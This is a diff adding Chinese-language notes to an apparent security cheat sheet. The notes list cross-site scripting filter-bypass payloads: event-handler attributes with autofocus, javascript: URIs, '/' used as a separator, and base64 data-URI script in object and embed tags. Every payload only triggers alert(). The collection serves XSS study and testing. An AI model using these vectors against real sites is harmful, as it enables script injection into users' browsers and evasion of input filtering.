@@ -410,6 +410,82 @@ http://drops.wooyun.org/tips/147
 ```
 
 
+
+### Notes
+
+非合法标签：
+```
+<M/onclick="alert(1)">M
+```
+
+标签和属性之间只能出现空格么？ 
+```
+<img/src=x onerror=alert(1)>
+```
+在有些情况下我们可以使用"/"来代替空格 
+
+
+【a标签的href属性】：
+```
+<a href=javascript:alert(2)>M 
+
+```
+
+可以用"/"来代替单引号和双引号
+```
+<script>alert(/3/)</script> 
+```
+
+【button标签】 ：
+```
+<form><button formaction=javascript&colon;alert(1)>M
+```
+
+无需交互的button：(使用onfocus事件，再加上autofocus我们就可以达到自动弹窗，无须交互了。 )
+```
+<button onfocus=alert(1) autofocus>
+```
+
+
+【body标签】
+```
+<body onload=alert(77)> 
+```
+
+【object标签】
+```
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>
+```
+
+【input标签】 
+
+```
+<input onfocus=alert(888) autofocus> 
+```
+
+【select标签】 
+```
+<select onfocus=javascript:alert(1) autofocus>
+```
+【textarea标签】 
+```
+<textarea onfocus=javascript:alert(1) autofocus>
+```
+
+【embed标签】 
+```
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed>    //chrome
+
+
+<embed src=javascript:alert('firefox')> //firefox
+```
+
+【video标签】 
+<video><source onerror="alert(1)"> 
+<video src=x onerror=alert(48)>
+【audio标签】 
+<audio src=x onerror=alert(47)>
+
 ### Ref
  
 - https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
